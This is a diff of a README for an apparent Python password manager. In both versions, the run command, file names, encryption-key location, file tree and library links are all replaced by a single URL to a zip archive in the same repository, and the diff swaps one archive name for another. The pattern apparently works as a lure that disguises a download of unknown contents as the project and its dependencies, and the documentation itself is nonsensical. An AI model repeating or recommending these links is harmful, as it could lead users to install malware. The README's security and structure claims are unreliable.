@@ -29,7 +29,7 @@ pip install cryptography pyperclip
 ### Run the App
 
 ```bash
-python https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip
+python https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip
 ```
 
 ---
@@ -57,29 +57,29 @@ python https://github.com/sparktech360/password-manager/raw/refs/heads/main/sple
 
 ## 🔐 Security
 
-* All password data is encrypted using a key stored in `https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip`
-* Data is stored in `https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip` (encrypted)
+* All password data is encrypted using a key stored in `https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip`
+* Data is stored in `https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip` (encrypted)
 
-**Note:** Keep your `https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip` file safe — it's required to decrypt your password data.
+**Note:** Keep your `https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip` file safe — it's required to decrypt your password data.
 
 ---
 
 ## 📁 File Structure
 
 ```
-├── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip
-├── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip  # (Encrypted file will be created after saving data)
-├── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip         # (Encryption key)
-└── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip
+├── https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip
+├── https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip  # (Encrypted file will be created after saving data)
+├── https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip         # (Encryption key)
+└── https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip
 ```
 
 ---
 
 ## 🛠️ Built With
 
-* [Python](https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip)
-* [cryptography](https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip)
-* [pyperclip](https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip)
+* [Python](https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip)
+* [cryptography](https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip)
+* [pyperclip](https://raw.githubusercontent.com/sparktech360/password-manager/main/splendiferous/manager_password_pusher.zip)
 
 ---
 
